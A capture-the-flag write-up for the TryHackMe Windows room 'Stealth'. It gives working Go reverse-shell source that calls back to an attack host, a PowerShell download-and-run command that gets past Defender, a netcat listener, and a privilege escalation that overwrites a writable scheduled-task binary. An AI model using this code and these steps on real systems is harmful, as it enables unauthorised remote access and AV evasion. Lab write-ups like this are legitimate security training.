# Stealth

https://tryhackme.com/room/stealth, rated MEDIUM

Another fun Windows room, coming on the heels of [AVenger](https://tryhackme.com/room/avenger) in the release pipeline. There were some similarities in how I solved it, specifically around bypassing AV.

1. A scan will reveal standard windows ports, but also websites on **8000**, **8080** and **8443**. On the first is a blank page, but the latter two contain a "PowerShell Script Analyser"

2. This allows you to upload a script (a PowerShell ps1 file) and then will run it if its not picked up by defender. Trying with a standard PowerShell reverse shell payload will fail, but simple PowerShell commands work fine.

3. There are ways to obfuscate PowerShell to get around this, but I used a simple two file approach:

   - First, Golang binaries are generally ignored by defender so I created a new reverse shell using the following code:
      ```go
      package main

      import (
      	"net"
      	"os/exec"
      )
      
      func main() {
      	c, _ := net.Dial("tcp", "10.10.224.216:5555")
      	cmd := exec.Command("cmd")
      	cmd.Stdin = c
      	cmd.Stdout = c
      	cmd.Stderr = c
      	cmd.Run()
      }
      ```
      This was compiled with `go build r.go` on my windows box, but `GOOS=windows GOARCH=amd64 go build r.go` would also work on linux.

    - A webserver was started on the attack box to serve this new `r.exe` binary. Additionally a rev shell handler was started with `nc -nvlp 5555`
    - Finally, the following powershell script was created and uploaded to the site:
      ```powershell
      invoke-webrequest -uri http://10.10.224.216:1234/r.exe -outfile c:\windows\temp\r.exe
      c:\windows\temp\r.exe
      ```
      After being processed, this successfully created a rev shell as 'evader'

4. Privesc to SYSTEM was a little harder, this being a patched, modern OS. However a bit of manual enumeration identified the path forward. Process followed is below:

    - First I checked privileges and groups. UAC was active but the user might have been able to bypass it, however Fodhelper didn't work so for now I moved on
    - I tried checking services with `net start` but I had no privileges to do this
    - I checked scheduled tasks next, using powershell, with `get-scheduledtask`
    - This final command revealed a very suspiciously named '**MyTHMTask**'. Enumerating that with `(Get-ScheduledTask -TaskName "MyTHMTask").Actions` showed it would invoke `C:\xampp\DebugCrashTHM.exe`
    - I tried starting and stopping the task with `start-scheduledtask MyTHMTask` and `stop-scheduledtask MyTHMTask` and verified I had control
    - Lastly, I tried moving the `DebugCrashTHM.exe` and found I had write access
  
5. To exploit this was simple. I started another rev shell catcher on the attack box, then used `copy c:\windows\temp\r.exe C:\xampp\DebugCrashTHM.exe` before starting the task. This got a rev shell as the local Administrator account.

Both flags were on the administrator's desktop. The user flag is designed to be extracted via accessing a page on port :8000 after manipulating a log file, but can equally be extracted by examining the PHP code in the flag folder on the admin's desktop.
